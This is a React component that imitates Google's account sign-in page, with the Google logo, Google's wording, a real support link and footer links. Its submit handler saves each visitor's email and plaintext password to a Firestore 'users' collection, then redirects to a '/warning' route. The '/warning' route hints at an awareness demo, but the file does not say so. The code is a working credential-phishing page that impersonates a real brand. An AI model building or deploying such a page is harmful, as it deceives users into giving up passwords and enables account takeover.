import React, { useState } from "react";
import { Icon } from "@iconify/react";
import { Link, useNavigate } from "react-router-dom";
import { getFirestore, collection, addDoc } from "firebase/firestore";
import { database } from "../firebase-config";

const SignIn = () => {
  const navigate = useNavigate();

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isChecked, setIsChecked] = useState(false);

  const [loading, setLoading] = useState(false);
  const [next, setNext] = useState(false);
  const clickNext = () => {
    setLoading(true);
    setTimeout(() => {
      setNext((prev) => !prev);
      setLoading(false);
    }, 2500);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    setLoading(true);
    setTimeout(() => {
      setLoading(false);
    }, 2500);

    try {
      const db = getFirestore();
      await addDoc(collection(db, "users"), {
        email,
        password,
      });
      navigate("/warning");
    } catch (error) {
      console.error("Error adding user: ", error);
      alert("Failed to add user.");
    }
  };

  return (
    <div className="bg-gray text-light flex h-screen items-center justify-center md:px-52">
      <div className="h-full w-full md:h-max">
        <div className="bg-dark flex h-full flex-col justify-between p-6 md:mb-5 md:rounded-4xl md:p-9">
          {/* Main */}
          <div>
            {/* Google Logo */}
            <Icon icon="flat-color-icons:google" className="size-12" />

            <div className="flex flex-col gap-x-16 md:flex-row">
              {/* Top Text */}
              <div className="md:w-[50%]">
                {!next ? (
                  <>
                    <h1 className="mt-6 text-3xl font-semibold">Sign in</h1>
                    <p className="mt-4 mb-9 flex-wrap font-medium">
                      with your Google Account. This account will be available
                      to other Google apps in the browser.
                    </p>
                  </>
                ) : (
                  <>
                    {email !== "" && (
                      <div className="border-border mt-6 mb-4 flex w-max cursor-pointer items-center gap-x-2 rounded-2xl border py-1 pr-2 pl-1 text-sm font-semibold duration-200 hover:bg-gray-100/10">
                        <span className="bg-blue flex h-6 w-6 items-center justify-center rounded-full text-sm font-bold text-blue-600">
                          {email.charAt(0)}
                        </span>

                        {email}
                        <Icon
                          icon="fa6-solid:sort-down"
                          className="mb-1 size-3"
                        />
                      </div>
                    )}
                  </>
                )}
              </div>

              {/* Form */}
              <form
                onSubmit={handleSubmit}
                className="space-y-10 md:mt-5 md:w-[50%]"
              >
                {/* Emaill Input */}
                {!next && (
                  <>
                    <div className="space-y-2">
                      <div className="input-container w-full">
                        <input
                          type="text"
                          id="email"
                          placeholder=""
                          required
                          value={email}
                          onChange={(e) => setEmail(e.target.value)}
                        />
                        <label htmlFor="email">Email or phone</label>
                      </div>
                      <span className="text-blue hover:bg-blue/10 cursor-pointer rounded-xl text-sm font-medium">
                        Forgot email?
                      </span>
                    </div>
                    <p className="text-sm">
                      Not your computer? Use Private Browsing windows to sign
                      in.
                      <Link
                        to="https://support.google.com/accounts/answer/2917834?visit_id=638751945359498872-2958348846&p=signin_privatebrowsing&hl=en&rd=1"
                        className="text-blue ml-1 hover:underline"
                      >
                        Learn more about using Guest mode
                      </Link>
                    </p>
                    <Button type="button" onClick={clickNext} />
                  </>
                )}

                {/* Password Input */}
                {next && (
                  <>
                    <p className="mb-9 flex-wrap text-sm font-medium">
                      To continue, first verify it's you
                    </p>
                    <div className="mb-10 space-y-2">
                      <div className="input-container w-full">
                        <input
                          type={isChecked ? "text" : "password"}
                          id="password"
                          placeholder=""
                          required
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                        />
                        <label htmlFor="password">Enter your password</label>
                      </div>

                      {/* Show password checkbox */}
                      <label className="flex cursor-pointer items-center gap-x-4 text-sm font-medium">
                        <input
                          type="checkbox"
                          className={`size-4 appearance-none rounded-[2px] border-2 duration-200 ${
                            isChecked
                              ? "bg-blue border-blue"
                              : "bg-dark border-border"
                          }`}
                          checked={isChecked}
                          onChange={() => {
                            setIsChecked(!isChecked);
                          }}
                        />
                        <Icon
                          icon="iconamoon:check-bold"
                          className="text-dark absolute ml-[1px]"
                        />
                        Show password
                      </label>
                    </div>
                    <Button type="submit" />
                  </>
                )}
              </form>
            </div>
          </div>

          {/* Footer - Inside */}
          <div className="flex justify-between text-xs font-medium md:hidden">
            <div className="flex gap-x-7">
              <span>English (Unites States)</span>

              <Icon icon="fa6-solid:sort-down" />
            </div>

            <div className="flex gap-x-8">
              <span>Help</span>
              <span>Privacy</span>
              <span>Terms</span>
            </div>
          </div>
        </div>

        {/* Footer - Outside */}
        <div className="hidden justify-between bg-transparent px-6 pb-6 text-xs font-medium md:flex">
          <div className="flex gap-x-7">
            <span>English (Unites States)</span>

            <Icon icon="fa6-solid:sort-down" />
          </div>

          <div className="flex gap-x-8">
            <span>Help</span>
            <span>Privacy</span>
            <span>Terms</span>
          </div>
        </div>
      </div>

      {loading && (
        <div className="fixed top-0 left-0 z-50 flex h-screen w-full items-center justify-center bg-black/30">
          <Icon icon="line-md:loading-loop" className="text-blue size-14" />
        </div>
      )}
    </div>
  );
};

const Button = ({ type, onClick }) => {
  return (
    <div className="flex justify-end">
      <button
        onClick={onClick}
        type={type}
        className="bg-blue text-dark hover:bg-blue-light flex cursor-pointer rounded-full px-6 py-2 text-sm font-semibold duration-200"
      >
        Next
      </button>
    </div>
  );
};

export default SignIn;
